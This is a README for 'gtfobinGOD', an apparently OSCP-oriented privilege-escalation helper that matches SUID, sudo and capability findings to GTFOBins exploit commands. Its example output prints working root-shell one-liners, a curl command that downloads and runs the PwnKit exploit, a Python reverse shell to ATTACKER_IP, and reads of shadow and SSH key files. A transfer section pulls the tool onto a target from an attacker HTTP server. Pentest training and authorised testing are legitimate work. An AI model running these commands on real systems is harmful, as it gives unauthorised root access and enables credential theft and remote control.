# gtfobinGOD

**The ultimate GTFOBins privilege escalation tool for OSCP exam.**

Auto-identifies exploitable SUID binaries, sudo permissions, and Linux capabilities — provides **instant copy-paste exploit commands**.

## Install

```bash
git clone https://github.com/bachrudinashari/gtfobinGOD.git
cd gtfobinGOD
sudo apt install python3-requests python3-bs4 -y
```

## Usage

```bash
python3 gtfobinsuid.py              # auto run ALL checks (SUID + sudo + cap)
python3 gtfobinsuid.py --exam       # clean output, only actionable results
python3 gtfobinsuid.py --check vim  # quick check single binary
python3 gtfobinsuid.py --update-db  # update database from GTFOBins
```

Or pipe manually:

```bash
find / -perm -u=s -type f 2>/dev/null | python3 gtfobinsuid.py --exam
sudo -l | python3 gtfobinsuid.py --sudo --exam
getcap -r / 2>/dev/null | python3 gtfobinsuid.py --cap --exam
```

## Example Output

```
[CRITICAL] python3.8 — SUID Shell
  python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

[CRITICAL] find — SUID Shell
  find . -exec /bin/sh -p \; -quit

[CRITICAL] pkexec — SUID Known Vuln
  # PwnKit CVE-2021-4034
  # curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit && chmod +x PwnKit && ./PwnKit

[HIGH] python3.8 — SUID Reverse Shell
  python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));...'

[MEDIUM] find — SUID File Read
  find /path/to/file -exec cat {} \;
```

## Flags

| Flag | Description |
|------|-------------|
| `--exam` | Only show priority 1-3, no banner |
| `--sudo` | Parse `sudo -l` output |
| `--cap` | Parse `getcap` output |
| `--check BINARY` | Quick check single binary |
| `--mode suid/sudo/capabilities` | Mode for `--check` |
| `--update-db` | Update db.txt from GTFOBins |
| `--json` | JSON output |
| `--online` | Force online check |
| `--offline` | Force offline only |

## Priority

| Level | Label | Meaning |
|-------|-------|---------|
| 1 | CRITICAL | Shell — instant root |
| 2 | HIGH | Reverse shell |
| 3 | MEDIUM | File read (shadow, SSH keys) |
| 4 | LOW | File write (passwd, crontab) |
| 5 | INFO | Needs extra work |

## Transfer to Target

```bash
# On Kali:
python3 -m http.server 80

# On target:
cd /tmp
wget http://KALI_IP/gtfobinsuid.py -O g.py
wget http://KALI_IP/db_commands.py
wget http://KALI_IP/db_hints.py
wget http://KALI_IP/db.txt
python3 g.py --exam
```

## Stats

- 279 binaries with exploit commands
- 25+ custom OSCP hints (PwnKit, Screen 4.5.0, Docker, LXD, etc)
- Works fully offline
- Python 3.6+

## Credits

- Inspired by [strikoder/gtfobinSUID](https://github.com/strikoder/gtfobinSUID)
- Data from [GTFOBins](https://gtfobins.github.io/)
